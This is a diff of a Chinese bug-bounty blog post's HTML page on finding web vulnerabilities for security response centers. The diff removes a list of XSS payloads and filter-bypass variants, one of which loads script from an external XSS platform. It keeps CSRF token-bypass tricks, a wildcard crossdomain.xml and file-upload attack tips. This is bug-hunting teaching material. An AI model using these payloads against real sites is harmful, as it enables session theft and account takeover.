@@ -127,7 +127,7 @@
 <meta property="og:site_name" content="Shu1L&#39;s blog">
 <meta property="og:description" content="SRC混子的漏洞挖掘之道本文首先于先知社区:SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com) 一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。 前期信息收集 还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括">
 <meta property="article:published_time" content="2021-01-16T13:36:41.000Z">
-<meta property="article:modified_time" content="2021-01-16T13:37:55.583Z">
+<meta property="article:modified_time" content="2021-01-27T06:27:55.508Z">
 <meta property="article:author" content="Shu1L">
 <meta name="twitter:card" content="summary">
 
@@ -631,55 +631,33 @@ xhr.withCredentials = true;
 xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&quot;);  xhr.send(&apos;{&quot;role&quot;:admin}&apos;);
 &lt;/script&gt;
 <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">3.</span> Flash 型</span><br><span class="line"></span><br><span class="line">Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</span><br><span class="line"></span><br><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、目标站点下必须存在crossdomain.xml文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、crossdomain.xml中的配置允许其他域进行跨域请求。</span><br></pre></td></tr></table></figure>
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt;
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="strong">**bypass小技巧**</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>删除csrf token</span><br><span class="line"><span class="bullet">- </span>置空csrf token</span><br><span class="line"><span class="bullet">- </span>修改请求方法，如POST方法变GET请求</span><br><span class="line"><span class="bullet">- </span>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</span><br><span class="line"><span class="bullet">- </span>使用固定token</span><br><span class="line"><span class="bullet">- </span>token字段改成 token[]=</span><br><span class="line"></span><br><span class="line"><span class="section">#### 任意文件上传漏洞</span></span><br><span class="line"></span><br><span class="line"> 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</span><br><span class="line"><span class="bullet">- </span>上传恶意文件进行钓鱼</span><br><span class="line"><span class="bullet">- </span>尝试在上传的文件名前加../进行目录穿越。</span><br><span class="line"><span class="bullet">- </span>可以结合其他漏洞比如CORS漏洞扩大危害。</span><br><span class="line"></span><br><span class="line"> 文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</span><br><span class="line"></span><br><span class="line"><span class="section">#### XSS漏洞</span></span><br><span class="line"></span><br><span class="line">老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:</span><br><span class="line">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</span><br><span class="line"></span><br><span class="line">Broken5师傅的xsspayload:</span><br></pre></td></tr></table></figure>
-&lt;script&gt;alert(1)&lt;/script&gt;
-&lt;script src=https://xsspt.com/VBAhTu&gt;&lt;/script&gt;
-&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;
-&lt;svg onload=alert(1)&gt;
-&lt;img src=1 onerror=alert(1)&gt;
-&lt;img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)&gt;
-&lt;details open ontoggle=alert(1)&gt;
-&lt;body onload=alert(1)&gt;
-&lt;M onmouseover=alert(1)&gt;M
-&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;
-&lt;iframe onload=alert(1)&gt;
-&lt;input type=&quot;submit&quot; onfocus=alert(1)&gt;
-&lt;input type=&quot;submit&quot; onclick=alert(1)&gt;
-&lt;form&gt;&lt;input type=&quot;submit&quot; formaction=javascript:alert(1)&gt;
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### bypass姿势</span><br></pre></td></tr></table></figure>
-&lt;!-- 空格被过滤 --&gt;
-&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;
-</code></pre></li>
+&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt;</code></pre></li>
 </ul>
-<!-- 双写绕过 -->
-<iimgmg src=1 oonerrornerror=aimglert(1)>
-
-<!-- 大小写绕过  -->
-<iMg src=1 oNerRor=alert(1)>
-
-<!-- 利用eval() -->
-<img src=1 onerror="a=`aler`;b=`t(1)`;eval(a+b);">
-<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
-
-<!-- 利用location -->
-<p>&lt;img src=1 onerror=location=’javascript:%61%6C%65%72%74%28%31%29’&gt;<br>&lt;img src=1 onerror=location=’javascript:\x61\x6C\x65\x72\x74\x28\x31\x29’&gt;<br>&lt;img src=1 onerror=location=”javascr”+”ipt:”+”%61%6C%65%72%74%28%31%29”&gt;</p>
-<!-- 括号被过滤 -->
-<img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';">
-
-<!-- onerror=被过滤 -->
-<img src=1 onerror     =alert(1)>
-<img src=1 onerror
-=alert(1)>
-
-<!-- 属性被转换为大写 -->
-<img src=1 onerror=alert(1)>
-
-<!-- 编码后被检测 -->
-<img src=1 onerror=alert(1)>
-```
-
-<h4 id="威胁情报的提交"><a href="#威胁情报的提交" class="headerlink" title="威胁情报的提交"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p>
+<p><strong>bypass小技巧</strong></p>
+<ul>
+<li>删除csrf token</li>
+<li>置空csrf token</li>
+<li>修改请求方法，如POST方法变GET请求</li>
+<li>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</li>
+<li>使用固定token</li>
+<li>token字段改成 token[]=</li>
+</ul>
+<h4 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h4><p> 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</p>
+<ul>
+<li><p>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</p>
+</li>
+<li><p>上传恶意文件进行钓鱼</p>
+</li>
+<li><p>尝试在上传的文件名前加../进行目录穿越。</p>
+</li>
+<li><p>可以结合其他漏洞比如CORS漏洞扩大危害。</p>
+<p>文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</p>
+</li>
+</ul>
+<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><p>老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:<br><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</a></p>
+<p>Broken5师傅的xsspayload:</p>
+<p><strong>hexo这里貌似会一直解析payload就不贴了，可以去先知看原文:)</strong></p>
+<h5 id="bypass姿势"><a href="#bypass姿势" class="headerlink" title="bypass姿势"></a>bypass姿势</h5><h4 id="威胁情报的提交"><a href="#威胁情报的提交" class="headerlink" title="威胁情报的提交"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p>
 <p><a href="https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q</a></p>
 <p><a href="https://bbs.ichunqiu.com/article-921-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-921-1.html</a></p>
 <p>可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。</p>
@@ -723,6 +701,10 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/" rel="prev" title="java代码审计之常见漏洞学习">
+                java代码审计之常见漏洞学习 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -803,7 +785,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-count">55</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -911,7 +893,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SRC混子的漏洞挖掘之道"><span class="nav-number">1.</span> <span class="nav-text">SRC混子的漏洞挖掘之道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前期信息收集"><span class="nav-number">1.1.</span> <span class="nav-text">前期信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#企业相关信息收集"><span class="nav-number">1.1.1.</span> <span class="nav-text">企业相关信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#子域名收集和网站信息收集"><span class="nav-number">1.1.2.</span> <span class="nav-text">子域名收集和网站信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通过github收集子域名"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">通过github收集子域名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#oneforAll"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">oneforAll</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xray"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">xray</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Goby"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">Goby</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#BBScan"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">BBScan</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js信息收集"><span class="nav-number">1.1.2.6.</span> <span class="nav-text">js信息收集</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#捡中低危漏洞的一些技巧"><span class="nav-number">1.2.</span> <span class="nav-text">捡中低危漏洞的一些技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#登录框处常见的一些漏洞"><span class="nav-number">1.2.1.</span> <span class="nav-text">登录框处常见的一些漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过限制导致的爆破、撞库、用户遍历漏洞"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">绕过限制导致的爆破、撞库、用户遍历漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#弱口令漏洞"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">弱口令漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注册、登录、找回密码处的短信-邮箱轰炸漏洞"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">注册、登录、找回密码处的短信\邮箱轰炸漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的信息泄露漏洞"><span class="nav-number">1.2.2.</span> <span class="nav-text">常见的信息泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#github导致的信息泄露"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">github导致的信息泄露</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#配置错误导致的信息泄露"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">配置错误导致的信息泄露</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#越权导致的信息泄露"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">越权导致的信息泄露</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他的OWASPTop10漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">其他的OWASPTop10漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF漏洞"><span class="nav-number">1.3.1.</span> <span class="nav-text">CSRF漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#威胁情报的提交"><span class="nav-number">1.3.2.</span> <span class="nav-text">威胁情报的提交</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于挖掘高危、严重级别漏洞的一些思考"><span class="nav-number">1.4.</span> <span class="nav-text">对于挖掘高危、严重级别漏洞的一些思考</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-自动化信息收集的能力"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">1.自动化信息收集的能力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-打漏洞组合拳的能力"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">2.打漏洞组合拳的能力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-绕waf的能力"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">3.绕waf的能力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-细心和耐心和一些运气"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">4.细心和耐心和一些运气</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">1.4.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SRC混子的漏洞挖掘之道"><span class="nav-number">1.</span> <span class="nav-text">SRC混子的漏洞挖掘之道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前期信息收集"><span class="nav-number">1.1.</span> <span class="nav-text">前期信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#企业相关信息收集"><span class="nav-number">1.1.1.</span> <span class="nav-text">企业相关信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#子域名收集和网站信息收集"><span class="nav-number">1.1.2.</span> <span class="nav-text">子域名收集和网站信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#通过github收集子域名"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">通过github收集子域名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#oneforAll"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">oneforAll</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#xray"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">xray</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Goby"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">Goby</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#BBScan"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">BBScan</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js信息收集"><span class="nav-number">1.1.2.6.</span> <span class="nav-text">js信息收集</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#捡中低危漏洞的一些技巧"><span class="nav-number">1.2.</span> <span class="nav-text">捡中低危漏洞的一些技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#登录框处常见的一些漏洞"><span class="nav-number">1.2.1.</span> <span class="nav-text">登录框处常见的一些漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过限制导致的爆破、撞库、用户遍历漏洞"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">绕过限制导致的爆破、撞库、用户遍历漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#弱口令漏洞"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">弱口令漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#注册、登录、找回密码处的短信-邮箱轰炸漏洞"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">注册、登录、找回密码处的短信\邮箱轰炸漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的信息泄露漏洞"><span class="nav-number">1.2.2.</span> <span class="nav-text">常见的信息泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#github导致的信息泄露"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">github导致的信息泄露</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#配置错误导致的信息泄露"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">配置错误导致的信息泄露</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#越权导致的信息泄露"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">越权导致的信息泄露</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他的OWASPTop10漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">其他的OWASPTop10漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF漏洞"><span class="nav-number">1.3.1.</span> <span class="nav-text">CSRF漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#任意文件上传漏洞"><span class="nav-number">1.3.2.</span> <span class="nav-text">任意文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS漏洞"><span class="nav-number">1.3.3.</span> <span class="nav-text">XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#bypass姿势"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">bypass姿势</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#威胁情报的提交"><span class="nav-number">1.3.4.</span> <span class="nav-text">威胁情报的提交</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于挖掘高危、严重级别漏洞的一些思考"><span class="nav-number">1.4.</span> <span class="nav-text">对于挖掘高危、严重级别漏洞的一些思考</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-自动化信息收集的能力"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">1.自动化信息收集的能力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-打漏洞组合拳的能力"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">2.打漏洞组合拳的能力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-绕waf的能力"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">3.绕waf的能力</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-细心和耐心和一些运气"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">4.细心和耐心和一些运气</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">1.4.1.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
